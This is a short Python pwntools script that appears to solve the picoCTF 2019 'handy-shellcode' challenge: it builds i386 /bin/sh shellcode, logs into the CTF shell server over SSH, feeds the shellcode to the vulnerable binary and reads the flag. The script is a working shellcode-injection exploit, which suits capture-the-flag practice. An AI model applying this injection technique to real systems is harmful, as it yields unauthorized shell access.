import sys
sys.path.append('/home/benpa/pico-ctf/')

from pwn import asm
from pwn import shellcraft
from pwn import ssh

import password_reader

# Read my password from a file so I don't have to delete password when uploading
pw = password_reader.get_password();
pw = pw.split("\n")[0]

# shellcode that starts a new shell
payload = asm(shellcraft.i386.linux.sh())

print(f'Using assembly code: {payload}')

path = "/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6"

ssh_client = ssh(host="2019shell1.picoctf.com", user="AlKanNot", password=pw)

vuln = ssh_client.process("vuln", \
        cwd="/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6")

vuln.sendlineafter(":\n", payload);
vuln.sendlineafter("$", "cat flag.txt");

vuln.interactive();
